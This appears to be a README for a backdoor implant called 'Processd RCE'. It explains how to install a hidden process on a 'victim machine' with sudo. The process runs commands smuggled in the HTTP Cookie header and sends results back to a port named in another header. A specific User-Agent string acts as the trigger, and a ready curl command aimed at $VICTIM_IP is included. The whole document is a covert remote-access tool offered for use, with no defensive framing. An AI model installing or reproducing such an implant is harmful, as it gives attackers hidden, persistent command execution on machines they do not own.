## Processd RCE

Creates a process called processd that runs a program that listens for commands hidden in the headers of an HTTP request:
- Cookie: The command to run
- Upgrade-Insecure_Requests: The local port to send command results to 

User Agent must match "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"

Example Attack:
`curl $VICTIM_IP -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: $CMD" -H "Upgrade-Insecure-Requests: $RETURN_PORT" > /dev/null 2>&1`

Installation:

cd into this folder on victim machine and run `sudo ./install.sh`
